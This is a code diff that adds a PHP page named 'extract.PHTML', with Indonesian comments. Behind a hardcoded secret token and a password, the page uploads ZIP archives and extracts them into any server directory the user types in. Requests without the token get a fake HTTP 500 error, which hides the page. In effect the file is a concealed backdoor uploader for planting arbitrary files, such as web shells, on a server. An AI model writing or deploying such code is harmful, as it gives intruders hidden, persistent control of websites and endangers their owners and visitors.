@@ -1,0 +1,311 @@
+<?php
+// extract.PHTML
+// Cegah error session
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
+}
+
+// ===== KONFIGURASI =====
+// Hash password (GENERATE DULU)
+$valid_password_hash = '$2a$12$X2vVYJ2EInDOf1dYBodDUOinH2fcoy59MG.0rTyLkJttdK/yKhzA2'; // GANTI DENGAN HASH HASIL GENERATE
+$valid_token = "biawakmayoyo";
+
+// ===== CEK TOKEN =====
+// KALO GA ADA TOKEN ATAU TOKEN SALAH -> LANGSUNG ERROR 500
+if (!isset($_GET['token']) || $_GET['token'] !== $valid_token) {
+    http_response_code(500);
+    die();
+}
+
+// ===== CEK LOGIN SESSION =====
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
+        // Verifikasi password dengan hash
+        if (password_verify($_POST['password'], $valid_password_hash)) {
+            $_SESSION['logged_in'] = true;
+            $_SESSION['login_time'] = time();
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?token=' . $valid_token);
+            exit;
+        } else {
+            $login_error = "❌ Password salah!";
+            error_log("Failed login attempt from IP: " . $_SERVER['REMOTE_ADDR'] . " at " . date('Y-m-d H:i:s'));
+        }
+    }
+    // Tampilkan form login
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Login - Extract ZIP</title>
+        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+        <style>
+            body {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .card {
+                border-radius: 20px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                animation: fadeInUp 0.5s ease;
+                max-width: 400px;
+                width: 100%;
+            }
+            @keyframes fadeInUp {
+                from {
+                    opacity: 0;
+                    transform: translateY(30px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+            .card-header {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                border-radius: 20px 20px 0 0 !important;
+                padding: 20px;
+                text-align: center;
+            }
+            .btn-primary {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                border: none;
+                transition: all 0.3s ease;
+            }
+            .btn-primary:hover {
+                transform: scale(1.02);
+                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="card">
+                <div class="card-header">
+                    <h4 class="mb-0">🔒 Protected Area</h4>
+                </div>
+                <div class="card-body">
+                    <?php if (isset($login_error)): ?>
+                        <div class="alert alert-danger alert-dismissible fade show">
+                            <?php echo $login_error; ?>
+                            <button type="button" class="close" data-dismiss="alert">&times;</button>
+                        </div>
+                    <?php endif; ?>
+                    <p class="text-muted text-center">Masukkan password untuk mengakses</p>
+                    <form method="POST">
+                        <div class="form-group">
+                            <input type="password" name="password" class="form-control form-control-lg" placeholder="Masukkan Password" required autofocus>
+                        </div>
+                        <button type="submit" class="btn btn-primary btn-lg btn-block">Login</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ===== HANDLE LOGOUT =====
+if (isset($_GET['logout']) && $_GET['logout'] == 'true') {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?token=' . $valid_token);
+    exit;
+}
+
+// ===== KODE ORIGINAL UNTUK UPLOAD ZIP =====
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['zip_file'])) {
+    $allowedExtensions = array("zip");
+    $uploadExtension = strtolower(pathinfo($_FILES['zip_file']['name'], PATHINFO_EXTENSION));
+
+    if (!in_array($uploadExtension, $allowedExtensions)) {
+        $errorMessage = "❌ File yang diunggah harus memiliki ekstensi .zip.";
+    } else {
+        $zipFilePath = $_FILES['zip_file']['tmp_name'];
+        $extractTo = rtrim($_POST['extract_to'], '/');
+
+        function extractZipFile($zipFilePath, $extractTo) {
+            if (!file_exists($zipFilePath)) {
+                return "❌ File ZIP tidak ditemukan.";
+            }
+            if (!is_dir($extractTo)) {
+                return "❌ Direktori tujuan tidak ditemukan.";
+            }
+            
+            $zip = new ZipArchive();
+            if ($zip->open($zipFilePath) === TRUE) {
+                $zip->extractTo($extractTo);
+                $zip->close();
+                return "✅ File ZIP berhasil diekstrak ke " . htmlspecialchars($extractTo);
+            } else {
+                return "❌ Tidak dapat membuka file ZIP.";
+            }
+        }
+
+        $successMessage = extractZipFile($zipFilePath, $extractTo);
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload dan Ekstrak File ZIP</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            margin: 50px auto;
+            animation: fadeInUp 0.5s ease;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #333;
+            font-weight: 700;
+        }
+        .form-group label {
+            font-weight: 600;
+            color: #555;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            padding: 12px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+        .success-message {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: #fff;
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 15px;
+            animation: slideIn 0.5s ease;
+            font-weight: 500;
+        }
+        .error-message {
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            color: #fff;
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 15px;
+            animation: slideIn 0.5s ease;
+            font-weight: 500;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .logout-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            z-index: 999;
+            text-decoration: none;
+        }
+        .logout-btn:hover {
+            background: #c82333;
+            transform: scale(1.05);
+            color: white;
+            text-decoration: none;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <!-- Tombol Logout -->
+    <a href="?token=<?php echo $valid_token; ?>&logout=true" class="logout-btn">🚪 Logout</a>
+
+    <div class="container">
+        <h2>📦 Upload & Ekstrak ZIP</h2>
+        
+        <form action="" method="post" enctype="multipart/form-data">
+            <div class="form-group">
+                <label for="zip_file">📁 Pilih file ZIP:</label>
+                <input type="file" name="zip_file" id="zip_file" accept=".zip" class="form-control-file" required>
+                <small class="form-text text-muted">Hanya file dengan ekstensi .zip</small>
+            </div>
+            
+            <div class="form-group">
+                <label for="extract_to">📂 Direktori Tujuan:</label>
+                <input type="text" name="extract_to" id="extract_to" class="form-control" value="<?php echo __DIR__; ?>" required>
+                <small class="form-text text-muted">Path absolut untuk ekstrak file</small>
+            </div>
+            
+            <button type="submit" class="btn btn-primary btn-block">
+                🚀 Upload dan Ekstrak
+            </button>
+        </form>
+        
+        <?php if (isset($successMessage)): ?>
+            <div class="success-message"><?php echo $successMessage; ?></div>
+        <?php endif; ?>
+        
+        <?php if (isset($errorMessage)): ?>
+            <div class="error-message"><?php echo $errorMessage; ?></div>
+        <?php endif; ?>
+        
+        <div class="info-text">
+            Session ID: <?php echo session_id(); ?><br>
+            Login: <?php echo date('Y-m-d H:i:s', $_SESSION['login_time'] ?? time()); ?>
+        </div>
+    </div>
+    
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
